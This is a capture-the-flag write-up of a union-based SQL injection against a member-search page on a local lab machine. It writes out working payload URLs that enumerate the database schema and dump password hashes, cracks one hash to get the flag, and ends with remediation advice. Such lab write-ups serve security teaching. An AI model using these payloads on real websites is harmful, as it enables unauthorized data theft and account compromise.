# Users Page

__http://192.168.99.101/?page=member&id=1&Submit=Submit__

## Description
This page allow to find the members of the service.
## Form Outputs
The [page](#http://192.168.99.101/?page=member&id=42%20union%20select%20database(),%20schema_name%20from%20information_schema.schemata&Submit=Submit) return the list of members

```
ID: 42 union select database(), schema_name from information_schema.schemata 
First name: Member_Sql_Injection
Surname : Member_Brute_Force
ID: 42 union select database(), schema_name from information_schema.schemata 
First name: Member_Sql_Injection
Surname : Member_Sql_Injection
ID: 42 union select database(), schema_name from information_schema.schemata 
First name: Member_Sql_Injection
Surname : Member_guestbook
ID: 42 union select database(), schema_name from information_schema.schemata 
First name: Member_Sql_Injection
Surname : Member_images
ID: 42 union select database(), schema_name from information_schema.schemata 
First name: Member_Sql_Injection
Surname : Member_survey
```

The [page](#http://192.168.99.101/?page=member&id=42%20union%20select%20table_name,%20create_time%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit) return the list of the tables

```
ID: 42 union select table_name, create_time from information_schema.tables where table_schema=database() 
First name: users
Surname : 2021-06-29 20:14:31
```

Let's check the column names [here](#http://192.168.99.101/?page=member&id=42%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)

```
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: user_id
Surname : int(11)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: first_name
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: last_name
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: town
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: country
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: planet
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: Commentaire
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
First name: countersign
Surname : varchar(255)
```
We've got the following columns ```user_id first_name last_name town country planet Commentaire countersign```

Then we get the personal data </br>
[select Commentaire, countersign from users](#http://192.168.99.101/?page=member&id=42%20union%20select%20Commentaire,%20countersign%20from%20users&Submit=Submit)
```
ID: 42 union select Commentaire, countersign from users 
First name: Je pense, donc je suis
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
ID: 42 union select Commentaire, countersign from users 
First name: Aamu on iltaa viisaampi.
Surname : 60e9032c586fb422e2c16dee6286cf10
ID: 42 union select Commentaire, countersign from users 
First name: Dublin is a city of stories and secrets.
Surname : e083b24a01c483437bcf4a9eea7c1b4d
ID: 42 union select Commentaire, countersign from users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

## Flag
The flag we've got is [FortyTwo](#https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28)
After converting FortyTwo to [sha256](#https://crypt-online.ru/crypts/sha256/) as in the instruction we get a flag.
```echo -n "FortyTwo" | shasum -a 256```

## Safety
The IT safety of the web in this case is compromised due to several security vulnerabilities, mainly SQL injection. 
The risk that the web is bringing includes unauthorized access to sensitive information such as member data and user credentials. The SQL injections allow an attacker to execute arbitrary queries on the database, which enables them to retrieve the list of members, tables, column names, and even personal data like comments and passwords.
These vulnerabilities can lead to potential data breaches, privacy violations, and unauthorized access to user accounts. It is crucial for the website administrators to address these security issues by implementing proper input validation and parameterized queries to prevent SQL injection attacks.
Additionally, storing passwords in plaintext or using weak encryption algorithms like SHA256/MD5 can also put user accounts at risk. It is essential to use strong and properly implemented hashing algorithms like bcrypt to securely store passwords.
Overall, the web's security is at high risk due to the presence of SQL injection vulnerabilities and weak password storage practices, which can lead to unauthorized access and potential harm to users' privacy and security.